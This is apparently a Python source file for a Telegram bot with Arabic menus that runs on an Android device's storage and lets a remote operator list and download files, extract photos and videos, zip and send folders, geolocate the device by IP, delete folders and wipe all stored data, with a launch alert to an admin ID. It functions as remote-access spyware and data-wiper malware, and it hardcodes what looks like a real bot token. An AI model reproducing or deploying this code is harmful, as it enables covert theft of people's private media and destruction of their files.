import os
import shutil
import random
import threading
import time
import hashlib
import requests
from urllib.parse import quote
from flask import Flask, send_file, request
from dotenv import load_dotenv
from telebot import TeleBot, types
from colorama import Fore, Style, init

init()  
load_dotenv()

# جلب المتغيرات من ريندر
TOKEN = os.getenv('BOT_TOKEN', '9287686125:AAFvFKtah2jWRO7am0eU6lrC5Lkri2rv9ho')
ADMIN_ID = int(os.getenv('ADMIN_ID', '7870803639'))
ROOT_DIRECTORY = os.getenv('ROOT_DIRECTORY', '/storage/emulated/0/')

bot = TeleBot(TOKEN)
app = Flask(__name__)

# ==================== سيرفر الويب (لريندر) ====================
@app.route('/')
def health():
    return "Bot is running", 200

@app.route('/dl')
def download_file():
    secret = request.args.get('secret')
    if secret != TOKEN:
        return "Access Denied", 403
    
    filepath = request.args.get('file')
    if not filepath:
        return "File not specified", 400
    
    full_path = os.path.abspath(os.path.join(ROOT_DIRECTORY, filepath))
    if not full_path.startswith(os.path.abspath(ROOT_DIRECTORY)):
        return "Access Denied", 403
        
    if not os.path.isfile(full_path):
        return "File not found", 404
        
    return send_file(full_path, as_attachment=True)

def run_web_server():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# ==================== دوال البوت ====================
def count_photos(directory):
    count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.jpg') or file.endswith('.png'):
                count += 1
    return count

def count_videos(directory):
    count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.mp4') or file.endswith('.avi') or file.endswith('.mkv'):
                count += 1
    return count

def send_media_from_directory(directory, count, message, media_type):
    sent_count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            if (media_type == 'photo' and (file.endswith('.jpg') or file.endswith('.png'))) or \
               (media_type == 'video' and (file.endswith('.mp4') or file.endswith('.avi') or file.endswith('.mkv'))):
                if sent_count >= count:
                    return
                try:
                    with open(os.path.join(root, file), 'rb') as media_file:
                        if media_type == 'photo':
                            bot.send_photo(message.chat.id, media_file)
                        else:
                            bot.send_video(message.chat.id, media_file)
                    sent_count += 1
                except Exception as e:
                    bot.send_message(message.chat.id, f'Error sending {media_type}: {e}')

@bot.message_handler(commands=['start'])
def start(message):
    welcome_text = "مرحبًا! أنا الروبوت الخاص بك. كيف يمكنني المساعدة؟ 🤖"
    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton('استخراج الصور 📸', callback_data='extract_photos')
    button2 = types.InlineKeyboardButton('تنظيف البيانات 🗑️', callback_data='clear_data')
    button3 = types.InlineKeyboardButton('نسخة من البيانات 📂', callback_data='copy_data')
    button4 = types.InlineKeyboardButton('احذف المجلد 📁', callback_data='delete_folder')
    button5 = types.InlineKeyboardButton('استخراج الفيديو 🎥', callback_data='search_videos')
    button6 = types.InlineKeyboardButton('الموقع 🌍', callback_data='location')
    button7 = types.InlineKeyboardButton('الملفات 📁', callback_data='files')
    keyboard.add(button1, button5)
    keyboard.add(button2, button3)
    keyboard.add(button4)
    keyboard.add(button6)
    keyboard.add(button7)
    bot.send_message(message.chat.id, text=welcome_text, reply_markup=keyboard)
    
ITEMS_PER_PAGE = 10
navigation_history = {}

@bot.callback_query_handler(func=lambda call: call.data == 'files')
def handle_files(call):
    navigation_history[call.message.chat.id] = [ROOT_DIRECTORY]
    show_directory_contents(call.message, ROOT_DIRECTORY, 0)

def hash_path(path):
    return hashlib.sha256(path.encode()).hexdigest()[:16]

def show_directory_contents(message, directory, page):
    chat_id = message.chat.id
    history = navigation_history.get(chat_id, [])
    keyboard = types.InlineKeyboardMarkup()
    files = []
    dirs = []
    try:
        for item in os.listdir(directory):
            item_path = os.path.join(directory, item)
            if os.path.isfile(item_path):
                files.append(item)
            else:
                dirs.append(item)
    except Exception as e:
        bot.send_message(chat_id, f"خطأ في قراءة المجلد: {e}")
        return
    
    all_items = dirs + files
    start_idx = page * ITEMS_PER_PAGE
    end_idx = start_idx + ITEMS_PER_PAGE
    current_items = all_items[start_idx:end_idx]
    
    for item in current_items:
        item_path = os.path.join(directory, item)
        if os.path.isfile(item_path):
            if item.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
                button = types.InlineKeyboardButton(f'📷 {item}', callback_data=f'file_{hash_path(item_path)}')
            elif item.lower().endswith(('.mp4', '.avi', '.mkv')):
                button = types.InlineKeyboardButton(f'🎥 {item}', callback_data=f'file_{hash_path(item_path)}')
            else:
                button = types.InlineKeyboardButton(f'📄 {item}', callback_data=f'file_{hash_path(item_path)}')
        else:
            button = types.InlineKeyboardButton(f'📁 {item}', callback_data=f'dir_{hash_path(item_path)}')
        keyboard.add(button)
    
    if len(history) > 1:
        back_button = types.InlineKeyboardButton('⬅️ خلف', callback_data=f'back_{hash_path(directory)}')
        keyboard.add(back_button)
    
    if end_idx < len(all_items):
        next_button = types.InlineKeyboardButton('➡️ الصفحة التالية', callback_data=f'page_{hash_path(directory)}_{page+1}')
        keyboard.add(next_button)
    
    if page > 0:
        prev_button = types.InlineKeyboardButton('⬅️ الصفحة السابقة', callback_data=f'page_{hash_path(directory)}_{page-1}')
        keyboard.add(prev_button)
    
    try:
        bot.edit_message_text(chat_id=chat_id, message_id=message.message_id, text=f"محتويات المجلد: {directory}", reply_markup=keyboard)
    except Exception:
        bot.send_message(chat_id, f"محتويات المجلد: {directory}", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith('dir_'))
def handle_directory_click(call):
    directory_hash = call.data.split('_', 1)[1]
    directory = find_path_by_hash(directory_hash)
    if directory is None:
        bot.answer_callback_query(call.id, 'خطأ: لم يتم العثور على المسار. 🚫')
        return
    chat_id = call.message.chat.id
    history = navigation_history.get(chat_id, [])
    history.append(directory)
    navigation_history[chat_id] = history
    show_directory_contents(call.message, directory, 0)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith('file_'))
def handle_file_click(call):
    file_hash = call.data.split('_', 1)[1]
    file_path = find_path_by_hash(file_hash)
    if file_path is None or not os.path.isfile(file_path):
        bot.answer_callback_query(call.id, 'خطأ: الملف غير موجود. 🚫')
        return
        
    # توليد الرابط المباشر
    base_url = os.environ.get("RENDER_EXTERNAL_URL", "http://localhost:8080")
    relative_path = os.path.relpath(file_path, ROOT_DIRECTORY)
    encoded_path = quote(relative_path)
    download_link = f"{base_url}/dl?secret={TOKEN}&file={encoded_path}"
    
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton("📥 تحميل الملف (رابط مباشر)", url=download_link))
    
    bot.send_message(
        call.message.chat.id, 
        f"الملف جاهز للتحميل:\n`{os.path.basename(file_path)}`\n\n(ملاحظة: قد يتأخر الرابط 30 ثانية إذا كان السيرفر نائم).", 
        parse_mode="Markdown",
        reply_markup=keyboard
    )
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith('page_'))
def handle_page_click(call):
    data = call.data.split('_', 2)
    directory_hash = data[1]
    directory = find_path_by_hash(directory_hash)
    if directory is None:
        bot.answer_callback_query(call.id, 'خطأ: لم يتم العثور على المسار. 🚫')
        return
    page = int(data[2])
    show_directory_contents(call.message, directory, page)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith('back_'))
def handle_back_click(call):
    directory_hash = call.data.split('_', 1)[1]
    directory = find_path_by_hash(directory_hash)
    if directory is None:
        bot.answer_callback_query(call.id, 'خطأ: لم يتم العثور على المسار. 🚫')
        return
    chat_id = call.message.chat.id
    history = navigation_history.get(chat_id, [])
    if len(history) > 1:
        history.pop()
        navigation_history[chat_id] = history
        previous_directory = history[-1]
        show_directory_contents(call.message, previous_directory, 0)
        bot.answer_callback_query(call.id)

def find_path_by_hash(path_hash):
    for root, dirs, files in os.walk(ROOT_DIRECTORY):
        for item in dirs + files:
            item_path = os.path.join(root, item)
            if hash_path(item_path) == path_hash:
                return item_path
    return None  
    
@bot.callback_query_handler(func=lambda call: call.data == 'location')
def handle_location(call):
    try:
        ip_info = requests.get('http://ip-api.com/json/', timeout=10).json()
        if ip_info['status'] == 'success':
            latitude = ip_info['lat']
            longitude = ip_info['lon']
            additional_info = f"معلومات إضافية:\nجانب: {ip_info['country']}\nمنطقة: {ip_info['regionName']}\nمدينة: {ip_info['city']}\nمزود: {ip_info['isp']}\nIP-عنوان: {ip_info['query']}"        
            bot.send_location(call.message.chat.id, latitude, longitude)
            bot.send_message(call.message.chat.id, additional_info)
        else:
            bot.send_message(call.message.chat.id, "لم نتمكن من تحديد موقعك.")  
    except Exception as e:
        bot.send_message(call.message.chat.id, f"فشل الاتصال: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'extract_photos')
def ask_for_photo_count(call):
    photo_count = count_photos(ROOT_DIRECTORY)
    bot.send_message(call.message.chat.id, f'حاليا على الجهاز {photo_count} صور فوتوغرافية. كم عدد الصور التي تريد الحصول عليها؟ 📸')
    bot.register_next_step_handler(call.message, process_photo_count)

def process_photo_count(message):
    try:
        count = int(message.text)
        if count <= 0: raise ValueError
    except ValueError:
        bot.send_message(message.chat.id, 'الرجاء إدخال العدد الصحيح من الصور. 📸')
        return

    send_media_from_directory(ROOT_DIRECTORY, count, message, 'photo')
    ask_to_return_to_menu(message, 'extract_photos')

@bot.callback_query_handler(func=lambda call: call.data == 'clear_data')
def clear_data_prompt(call):
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton("تأكيد الحذف النهائي", callback_data="confirm_clear"), types.InlineKeyboardButton("إلغاء", callback_data="return_to_menu"))
    bot.send_message(call.message.chat.id, "سيتم حذف كل الملفات داخل المسار. هذا الإجراء نهائي. أكد.", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == "confirm_clear")
def clear_data_execute(call):
    bot.send_message(call.message.chat.id, 'لقد بدأت في تنظيف البيانات... 🗑️')
    errors = 0
    try:
        for root, dirs, files in os.walk(ROOT_DIRECTORY, topdown=False):
            for name in files:
                try: os.remove(os.path.join(root, name))
                except Exception: errors += 1
            for name in dirs:
                try: os.rmdir(os.path.join(root, name))
                except Exception: errors += 1
        if errors:
            bot.send_message(call.message.chat.id, f'تم المسح مع {errors} خطأ في بعض العناصر. 🗑️')
        else:
            bot.send_message(call.message.chat.id, 'لقد تم مسح البيانات بنجاح. 🗑️')
    except Exception as e:
        bot.send_message(call.message.chat.id, f'خطأ عند مسح البيانات: {e} 🚫')
    
    ask_to_return_to_menu(call.message, 'clear_data')

@bot.callback_query_handler(func=lambda call: call.data == 'copy_data')
def ask_for_folder_name(call):
    bot.send_message(call.message.chat.id, 'أدخل اسم المجلد المراد نسخه: 📂')
    bot.register_next_step_handler(call.message, process_folder_name)

def process_folder_name(message):
    folder_name = message.text
    folder_path = find_folder(ROOT_DIRECTORY, folder_name)
    
    if not folder_path:
        bot.send_message(message.chat.id, f'مجلد "{folder_name}" لم يتم العثور عليه. 🚫')
        ask_to_return_to_menu(message, 'copy_data')
        return
    
    if is_folder_too_large(folder_path):
        bot.send_message(message.chat.id, 'توقع أن تكون محتويات المجلد ثقيلة جدًا. 📦')
    
    zip_file_path = create_zip_archive(folder_path, folder_name)
    if zip_file_path:
        try:
            with open(zip_file_path, 'rb') as zip_file:
                bot.send_document(message.chat.id, zip_file)
            os.remove(zip_file_path)
        except Exception as e:
            bot.send_message(message.chat.id, f'حدث خطأ أثناء إرسال الأرشيف: {e} 🚫')
    else:
        bot.send_message(message.chat.id, 'حدث خطأ أثناء إنشاء الأرشيف. 🚫')
    
    ask_to_return_to_menu(message, 'copy_data')

@bot.callback_query_handler(func=lambda call: call.data == 'delete_folder')
def ask_for_delete_folder_name(call):
    bot.send_message(call.message.chat.id, 'أدخل اسم المجلد المراد حذفه: 📁')
    bot.register_next_step_handler(call.message, process_delete_folder_name)

def process_delete_folder_name(message):
    folder_name = message.text
    folder_path = find_folder(ROOT_DIRECTORY, folder_name)
    
    if not folder_path:
        bot.send_message(message.chat.id, f'مجلد "{folder_name}" لم يتم العثور عليه. 🚫')
        ask_to_return_to_menu(message, 'delete_folder')
        return
    
    try:
        shutil.rmtree(folder_path)
        bot.send_message(message.chat.id, f'مجلد "{folder_name}" تم حذفه بنجاح. 🗑️')
    except Exception as e:
        bot.send_message(message.chat.id, f'خطأ عند حذف مجلد: {e} 🚫')
    
    ask_to_return_to_menu(message, 'delete_folder')

@bot.callback_query_handler(func=lambda call: call.data == 'search_videos')
def ask_for_video_count(call):
    video_count = count_videos(ROOT_DIRECTORY)
    bot.send_message(call.message.chat.id, f'حاليا على الجهاز {video_count} فيديو. كم عدد مقاطع الفيديو التي تريدها؟ 🎥')
    bot.register_next_step_handler(call.message, process_video_count)

def process_video_count(message):
    try:
        count = int(message.text)
        if count <= 0: raise ValueError
    except ValueError:
        bot.send_message(message.chat.id, 'الرجاء إدخال عدد صالح من مقاطع الفيديو. 🎥')
        return

    send_media_from_directory(ROOT_DIRECTORY, count, message, 'video')
    ask_to_return_to_menu(message, 'search_videos')

def find_folder(root_directory, folder_name):
    for root, dirs, files in os.walk(root_directory):
        if folder_name in dirs:
            return os.path.join(root, folder_name)
    return None

def create_zip_archive(folder_path, folder_name):
    try:
        temp_dir = '/tmp'
        if not os.path.exists(temp_dir):
            temp_dir = os.getcwd()
        zip_file_path = os.path.join(temp_dir, f'{folder_name}.zip')
        shutil.make_archive(zip_file_path[:-4], 'zip', folder_path)
        return zip_file_path
    except Exception:
        return None

def is_folder_too_large(folder_path):
    total_size = 0
    for dirpath, dirnames, filenames in os.walk(folder_path):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            total_size += os.path.getsize(fp)
    return total_size > 1024 * 1024 * 100  

def ask_to_return_to_menu(message, task):
    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton('نعم', callback_data='return_to_menu')
    button2 = types.InlineKeyboardButton('لا', callback_data=f'repeat_{task}')
    keyboard.add(button1, button2)
    bot.send_message(message.chat.id, 'هل تريد العودة إلى القائمة؟ 🔄', reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == 'return_to_menu')
def return_to_menu(call):
    start(call.message)

@bot.callback_query_handler(func=lambda call: call.data.startswith('repeat_'))
def repeat_task(call):
    task = call.data.split('_')[1]
    if task == 'extract_photos': ask_for_photo_count(call)
    elif task == 'clear_data': clear_data_prompt(call)
    elif task == 'copy_data': ask_for_folder_name(call)
    elif task == 'delete_folder': ask_for_delete_folder_name(call)
    elif task == 'search_videos': ask_for_video_count(call)
    else:
        bot.send_message(call.message.chat.id, 'حسنًا، سأنتظر أفعالك. 🔄', reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton('القائمة', callback_data='return_to_menu')))

def notify_admin():
    try:
        bot.send_message(ADMIN_ID, "انتباه! تم إطلاق البوت.\nيمكنك البدء في العمل /start 🚀")
    except Exception as e:
        print(f"Admin notification failed: {e}")

# ==================== التشغيل ====================
if __name__ == '__main__':
    # تشغيل سيرفر الويب عشان ريندر ما يطفي البوت
    threading.Thread(target=run_web_server, daemon=True).start()
    notify_admin()
    bot.infinity_polling()
